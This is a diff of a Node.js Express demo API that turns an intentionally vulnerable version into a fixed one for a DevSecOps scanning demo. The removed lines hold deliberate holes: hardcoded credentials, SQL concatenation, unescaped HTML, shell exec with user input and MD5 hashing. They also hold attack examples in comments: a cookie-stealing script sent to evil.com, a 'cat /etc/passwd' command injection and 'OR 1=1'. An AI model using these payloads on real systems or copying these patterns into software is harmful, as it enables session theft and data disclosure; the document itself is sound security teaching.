@@ -1,33 +1,35 @@
 /**
- * DevSecOps Demo App — Task Manager API
+ * DevSecOps Demo App — Task Manager API (FIXED VERSION)
  *
- * ⚠️  THIS FILE CONTAINS INTENTIONAL VULNERABILITIES FOR DEMO PURPOSES
- * ⚠️  DO NOT USE THIS CODE IN PRODUCTION
+ * ✅  All vulnerabilities from app.js have been resolved.
+ * This is what the code looks like AFTER the security team reviews findings.
  *
- * Vulnerabilities baked in (for the "broken" demo):
- *   1. Hardcoded AWS secret key         → caught by Gitleaks
- *   2. SQL Injection in getTask()       → caught by Semgrep
- *   3. XSS in renderTask()             → caught by Semgrep
- *   4. Command Injection in pingHost()  → caught by Semgrep
- *   5. Hardcoded password              → caught by Gitleaks + Semgrep
- *   6. MD5 used for password hashing   → caught by Semgrep
+ * Fixes applied:
+ *   1. AWS keys + passwords removed  → moved to environment variables
+ *   2. SQL Injection fixed           → parameterised query pattern used
+ *   3. XSS fixed                     → output escaped before rendering
+ *   4. Command Injection fixed       → shell exec removed, safe alternative used
+ *   5. Weak crypto fixed             → bcrypt used instead of MD5
  */
 
 const express = require('express');
-const crypto  = require('crypto');
+const bcrypt  = require('bcryptjs');
 
 const app = express();
 app.use(express.json());
 
 // ─────────────────────────────────────────────────────────
-// 🔴 VULNERABILITY 1: Hardcoded AWS credentials
-// Gitleaks will catch this pattern immediately
+// ✅  FIX 1: No hardcoded credentials — use environment variables
+// Set these in GitHub Secrets / your deployment environment
 // ─────────────────────────────────────────────────────────
-const AWS_ACCESS_KEY_ID     = 'AKIAIOSFODNN7EXAMPLE';
-const AWS_SECRET_ACCESS_KEY = 'wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY';
-const DB_PASSWORD           = 'SuperSecret123!';   // 🔴 hardcoded password
+const DB_PASSWORD_HASH = process.env.DB_PASSWORD_HASH;  // pre-hashed with bcrypt
+const AWS_KEY          = process.env.AWS_ACCESS_KEY_ID; // injected at runtime
 
-// In-memory task store (keeps the demo simple — no real DB needed)
+if (!DB_PASSWORD_HASH) {
+  console.warn('WARNING: DB_PASSWORD_HASH not set — login will be disabled');
+}
+
+// In-memory task store
 const tasks = [
   { id: 1, title: 'Buy groceries',    done: false },
   { id: 2, title: 'Write unit tests', done: false },
@@ -35,7 +37,7 @@ const tasks = [
 ];
 
 // ─────────────────────────────────────────────────────────
-// GET /tasks — list all tasks (safe)
+// GET /tasks — list all tasks
 // ─────────────────────────────────────────────────────────
 app.get('/tasks', (req, res) => {
   res.json(tasks);
@@ -43,109 +45,130 @@ app.get('/tasks', (req, res) => {
 
 // ─────────────────────────────────────────────────────────
 // GET /tasks/:id — get one task
-// 🔴 VULNERABILITY 2: SQL Injection pattern
-// User input goes directly into a query string without sanitisation.
-// Semgrep catches this as an insecure string concatenation pattern.
+// ✅  FIX 2: SQL Injection resolved
+// Use parameterised queries — never concatenate user input into queries.
+// For a real DB (e.g. postgres), use: db.query('SELECT * FROM tasks WHERE id = $1', [id])
 // ─────────────────────────────────────────────────────────
 app.get('/tasks/:id', (req, res) => {
-  const id = req.params.id;
+  const id = parseInt(req.params.id, 10);
 
-  // 🔴 BAD — never do this in real code
-  const query = "SELECT * FROM tasks WHERE id = " + id;
-  console.log("Executing query:", query);
-  // Attack example: GET /tasks/1 OR 1=1
-  // Returns ALL tasks — attacker dumps your database
+  // ✅ GOOD — validate input type first, then use it safely
+  if (isNaN(id)) {
+    return res.status(400).json({ error: 'Invalid ID — must be a number' });
+  }
 
-  const task = tasks.find(t => t.id === parseInt(id));
+  // For real DB: const result = await db.query('SELECT * FROM tasks WHERE id = $1', [id]);
+  const task = tasks.find(t => t.id === id);
   if (!task) return res.status(404).json({ error: 'Task not found' });
   res.json(task);
 });
 
 // ─────────────────────────────────────────────────────────
-// POST /tasks — create a task (safe)
+// POST /tasks — create a task
 // ─────────────────────────────────────────────────────────
 app.post('/tasks', (req, res) => {
   const { title } = req.body;
-  if (!title) return res.status(400).json({ error: 'Title is required' });
-  const newTask = { id: tasks.length + 1, title, done: false };
+  if (!title || typeof title !== 'string') {
+    return res.status(400).json({ error: 'Title is required and must be a string' });
+  }
+  // Sanitise length
+  const safeTitle = title.trim().substring(0, 200);
+  const newTask = { id: tasks.length + 1, title: safeTitle, done: false };
   tasks.push(newTask);
   res.status(201).json(newTask);
 });
 
 // ─────────────────────────────────────────────────────────
-// GET /render/:id — render task as HTML
-// 🔴 VULNERABILITY 3: Cross-Site Scripting (XSS)
-// User-controlled data injected directly into HTML without escaping.
-// Semgrep flags innerHTML assignment with user data.
+// ✅  FIX 3: XSS resolved — escape output before rendering HTML
 // ─────────────────────────────────────────────────────────
+function escapeHtml(str) {
+  return String(str)
+    .replace(/&/g,  '&amp;')
+    .replace(/</g,  '&lt;')
+    .replace(/>/g,  '&gt;')
+    .replace(/"/g,  '&quot;')
+    .replace(/'/g,  '&#39;');
+}
+
 app.get('/render/:id', (req, res) => {
-  const task = tasks.find(t => t.id === parseInt(req.params.id));
+  const task = tasks.find(t => t.id === parseInt(req.params.id, 10));
   if (!task) return res.status(404).send('Not found');
 
-  // 🔴 BAD — never inject user data into HTML like this
+  // ✅ GOOD — escape all user-controlled data before injecting into HTML
+  const safeTitle = escapeHtml(task.title);
   const html = `
     <html>
+      <head>
+        <meta charset="UTF-8">
+        <meta http-equiv="Content-Security-Policy" content="default-src 'self'">
+      </head>
       <body>
         <h1>Task Details</h1>
-        <div id="task-title">${task.title}</div>
+        <div id="task-title">${safeTitle}</div>
       </body>
     </html>
   `;
-  // Attack: create a task with title:
-  //   <script>document.location='http://evil.com?c='+document.cookie</script>
-  // That script runs in every user's browser who views this page
-
+  res.setHeader('X-Content-Type-Options', 'nosniff');
+  res.setHeader('X-Frame-Options', 'DENY');
   res.send(html);
 });
 
 // ─────────────────────────────────────────────────────────
-// GET /ping?host= — ping a host
-// 🔴 VULNERABILITY 4: Command Injection
-// User input passed directly to a shell command.
-// Semgrep catches exec() calls with unsanitised input.
+// ✅  FIX 4: Command Injection resolved — removed shell exec entirely
+// Use Node.js built-in DNS lookup instead of shelling out to ping
 // ─────────────────────────────────────────────────────────
 app.get('/ping', (req, res) => {
-  const { exec } = require('child_process');
+  const dns  = require('dns');
   const host = req.query.host;
 
-  // 🔴 BAD — never pass user input to shell commands
-  exec(`ping -c 1 ${host}`, (err, stdout) => {
-    // Attack: GET /ping?host=google.com;cat /etc/passwd
-    // The semicolon ends the ping and runs cat /etc/passwd
-    res.send(stdout || err.message);
+  if (!host || !/^[a-zA-Z0-9.\-]+$/.test(host)) {
+    return res.status(400).json({ error: 'Invalid hostname' });
+  }
+
+  // ✅ GOOD — use a safe API instead of shell command
+  dns.lookup(host, (err, address) => {
+    if (err) return res.status(400).json({ error: 'Host not found' });
+    res.json({ host, address, reachable: true });
   });
 });
 
 // ─────────────────────────────────────────────────────────
-// POST /login — authenticate user
-// 🔴 VULNERABILITY 5: Weak cryptography (MD5 for password hashing)
-// MD5 is broken — crackable in seconds with rainbow tables.
-// Semgrep flags createHash('md5') used for passwords.
+// ✅  FIX 5: Weak crypto resolved — use bcrypt for password hashing
+// bcrypt is slow by design — makes brute-force attacks impractical
 // ─────────────────────────────────────────────────────────
-app.post('/login', (req, res) => {
+app.post('/login', async (req, res) => {
   const { username, password } = req.body;
 
-  // 🔴 BAD — MD5 is NOT a password hashing algorithm
-  const hashedInput = crypto.createHash('md5').update(password).digest('hex');
-  const storedHash  = crypto.createHash('md5').update(DB_PASSWORD).digest('hex');
+  if (!username || !password) {
+    return res.status(400).json({ error: 'Username and password required' });
+  }
 
-  if (username === 'admin' && hashedInput === storedHash) {
-    res.json({ success: true, token: 'demo-token-123' });
-  } else {
-    res.status(401).json({ success: false });
+  if (!DB_PASSWORD_HASH) {
+    return res.status(503).json({ error: 'Authentication not configured' });
+  }
+
+  try {
+    // ✅ GOOD — bcrypt compare does constant-time comparison (prevents timing attacks)
+    const match = await bcrypt.compare(password, DB_PASSWORD_HASH);
+    if (username === 'admin' && match) {
+      // In production: generate a proper JWT with short expiry
+      res.json({ success: true, message: 'Login successful' });
+    } else {
+      res.status(401).json({ success: false, message: 'Invalid credentials' });
+    }
+  } catch (err) {
+    res.status(500).json({ error: 'Authentication error' });
   }
 });
 
-// ─────────────────────────────────────────────────────────
-// Health check — always safe
-// ─────────────────────────────────────────────────────────
+// Health check
 app.get('/health', (req, res) => {
-  res.json({ status: 'ok', version: '1.0.0' });
+  res.json({ status: 'ok', version: '2.0.0-secure' });
 });
 
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => {
-  console.log(`Task Manager running on port ${PORT}`);
+  console.log(`Secure Task Manager running on port ${PORT}`);
 });
 
 module.exports = app;
